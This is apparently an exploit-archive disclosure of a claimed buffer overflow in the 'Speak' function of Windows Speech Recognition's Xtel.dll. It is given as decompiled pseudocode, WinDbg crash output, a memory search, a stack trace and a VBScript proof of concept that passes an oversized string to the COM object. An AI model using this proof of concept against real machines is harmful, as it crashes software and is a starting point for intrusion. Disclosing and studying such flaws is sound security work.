@@ -1,0 +1,179 @@
+# Title: Windows Speech Recognition- Buffer Overflow
+
+# Author: Nassim Asrir
+
+# Contact: wassline@gmail.com | https://www.linkedin.com/in/nassim-asrir-b73a57122/
+
+# Vendor: https://www.microsoft.com/
+
+About Windows Speech Recognition:
+=================================
+
+Windows Speech Recognition lets you control your PC by voice alone, without needing a keyboard or mouse.
+
+Details:
+========
+
+If we navigate the Speech directory on Windows 10 we will get some (dll) files but the interest file is (Xtel.dll).
+
+And in the normal case if we say something. that mean as there a variable which register what we say.
+
+And if we play around "Xtel.dll" we will find a function named "Speak" which take to parameter "lineID as Long" and "text as String"
+
+When we inject "A*3092" that lead to Buffer Overflow Vulnerability.
+
+The crash occur in "6344164F	MOV ECX,[EAX+2C]" 
+
+
+/* struct s0 {
+    int8_t[44] pad44;
+    int32_t f44;
+};
+
+void fun_634548b6(int32_t ecx, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
+
+void fun_63441643() {
+    int32_t ecx1;
+    struct s0* v2;
+    int32_t v3;
+
+    ecx1 = v2->f44;
+    fun_634548b6(ecx1, v3, 0, 1, __return_address());
+} */
+
+Now we will run our POC.
+
+0:000> g
+ModLoad: 74250000 74276000   C:\WINDOWS\SysWOW64\IMM32.DLL
+ModLoad: 74d60000 74d6f000   C:\WINDOWS\SysWOW64\kernel.appcore.dll
+ModLoad: 71850000 718cc000   C:\WINDOWS\SysWOW64\uxtheme.dll
+ModLoad: 6ee90000 6ef16000   C:\WINDOWS\SysWOW64\sxs.dll
+ModLoad: 77590000 776d4000   C:\WINDOWS\SysWOW64\MSCTF.dll
+ModLoad: 6f720000 6f743000   C:\WINDOWS\SysWOW64\dwmapi.dll
+ModLoad: 6bc40000 6bddc000   C:\WINDOWS\SysWOW64\urlmon.dll
+ModLoad: 777f0000 77878000   C:\WINDOWS\SysWOW64\shcore.dll
+ModLoad: 6cb20000 6cd45000   C:\WINDOWS\SysWOW64\iertutil.dll
+ModLoad: 74790000 74d4a000   C:\WINDOWS\SysWOW64\windows.storage.dll
+ModLoad: 76f00000 76f45000   C:\WINDOWS\SysWOW64\shlwapi.dll
+ModLoad: 776f0000 77708000   C:\WINDOWS\SysWOW64\profapi.dll
+ModLoad: 75230000 75275000   C:\WINDOWS\SysWOW64\powrprof.dll
+ModLoad: 77730000 77738000   C:\WINDOWS\SysWOW64\FLTLIB.DLL
+ModLoad: 74340000 743c3000   C:\WINDOWS\SysWOW64\clbcatq.dll
+ModLoad: 63a90000 63ac6000   C:\Windows\SysWOW64\scrobj.dll
+ModLoad: 6b730000 6b741000   C:\WINDOWS\SysWOW64\WLDP.DLL
+ModLoad: 77200000 77396000   C:\WINDOWS\SysWOW64\CRYPT32.dll
+ModLoad: 753a0000 753ae000   C:\WINDOWS\SysWOW64\MSASN1.dll
+ModLoad: 751e0000 75227000   C:\WINDOWS\SysWOW64\WINTRUST.dll
+ModLoad: 73010000 73023000   C:\WINDOWS\SysWOW64\CRYPTSP.dll
+ModLoad: 72fb0000 72fdf000   C:\WINDOWS\SysWOW64\rsaenh.dll
+ModLoad: 73820000 73839000   C:\WINDOWS\SysWOW64\bcrypt.dll
+ModLoad: 63a80000 63a8a000   C:\Windows\SysWOW64\MSISIP.DLL
+ModLoad: 74540000 7459f000   C:\WINDOWS\SysWOW64\coml2.dll
+ModLoad: 63a60000 63a78000   C:\Windows\SysWOW64\wshext.dll
+ModLoad: 75480000 767ca000   C:\WINDOWS\SysWOW64\SHELL32.dll
+ModLoad: 74d70000 74da9000   C:\WINDOWS\SysWOW64\cfgmgr32.dll
+ModLoad: 63b00000 63b86000   C:\Windows\SysWOW64\vbscript.dll
+ModLoad: 63af0000 63aff000   C:\WINDOWS\SysWOW64\amsi.dll
+ModLoad: 73950000 73971000   C:\WINDOWS\SysWOW64\USERENV.dll
+ModLoad: 63ad0000 63ae9000   C:\ProgramData\Microsoft\Windows Defender\platform\4.18.1806.18062-0\X86\MpOav.dll
+ModLoad: 63440000 63472000   C:\Windows\speech\Xtel.dll
+(347c.1e00): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\speech\Xtel.dll - 
+eax=00000001 ebx=63441643 ecx=63441643 edx=ffffffff esi=02c93664 edi=02c93644
+eip=6344164f esp=02afe2b0 ebp=02afe2d8 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+Xtel+0x164f:
+6344164f 8b482c          mov     ecx,dword ptr [eax+2Ch] ds:002b:0000002d=???????? <=====
+
+Now we will try to find our injected "AAA"
+
+0:000> s -a 0x00000000 L?7fffffff "AAAAA"
+
+75db1cad  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cae  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1caf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cb0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cb1  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cb2  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cb3  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cb4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cb5  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cb6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cb7  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cb9  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cba  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cbb  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cbc  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cbd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cbe  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cbf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cc0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cc1  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cc2  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cc3  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cc4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cc5  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cc6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cc7  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cc8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cc9  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+75db1cca  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+
+0:000> k
+ # ChildEBP RetAddr  
+00 030fe6a8 753de4ef Xtel+0x164f
+01 030fe6c8 753cf69d OLEAUT32!DispCallFunc+0x16f
+02 030fe980 634454eb OLEAUT32!CTypeInfo2::Invoke+0x2ed
+WARNING: Stack unwind information not available. Following frames may be wrong.
+03 030fe9b0 6344a27f Xtel+0x54eb
+04 030fe9dc 63b1b6e7 Xtel!DllUnregisterServer+0x502
+05 030fea20 63b2832f vbscript!IDispatchInvoke2+0x96
+06 030fec6c 63b2fdcc vbscript!InvokeDispatch+0x5ef
+07 030fee84 63b29677 vbscript!CScriptRuntime::RunNoEH+0x5bbc
+08 030feed4 63b289d5 vbscript!CScriptRuntime::Run+0xc7
+09 030fefe4 63b23e93 vbscript!CScriptEntryPoint::Call+0xe5
+0a 030ff070 63b25265 vbscript!CSession::Execute+0x443
+0b 030ff0bc 63b262c2 vbscript!COleScript::ExecutePendingScripts+0x15a
+0c 030ff0e0 63a9c143 vbscript!COleScript::SetScriptState+0x62
+0d 030ff10c 63a9cd22 scrobj!ComScriptlet::Inner::StartEngines+0x7c
+0e 030ff1f8 63a9b222 scrobj!ComScriptlet::Inner::Init+0x222
+0f 030ff20c 63a9b00c scrobj!ComScriptlet::New+0x43
+10 030ff230 003de390 scrobj!ComScriptletConstructor::Create+0x3c
+11 030ff2b8 003d9693 wscript!CHost::RunXMLScript+0x411
+12 030ff508 003dae64 wscript!CHost::Execute+0x284
+13 030ffac4 003d8f75 wscript!CHost::Main+0x574
+14 030ffd7c 003d9144 wscript!StringCchPrintfA+0xfa9
+15 030ffda8 003d7a83 wscript!WinMain+0x1a9
+16 030ffdf8 76f68484 wscript!WinMainCRTStartup+0x63
+17 030ffe0c 779d2fea KERNEL32!BaseThreadInitThunk+0x24
+18 030ffe54 779d2fba ntdll!__RtlUserThreadStart+0x2f
+19 030ffe64 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+POC:
+===
+
+<?XML version='1.0' standalone='yes' ?>
+<package><job id='DoneInVBS' debug='false' error='true'>
+<object classid='clsid:FC9E740F-6058-11D1-8C66-0060081841DE' id='target' />
+<script language='vbscript'>
+
+'Wscript.echo typename(target)
+
+'for debugging/custom prolog
+vulnerable_DLL = "C:\Windows\speech\Xtel.dll"
+prototype  = "Sub Speak ( ByVal lineID As Long ,  ByVal text As String )"
+vulnerable_function = "Speak"
+progid     = "TELLib.phone"
+argCount   = 2
+
+arg1=1
+arg2=String(3092, "AAAAA")
+
+target.Speak arg1 ,arg2 
+
+</script></job></package>
+
+#EOF
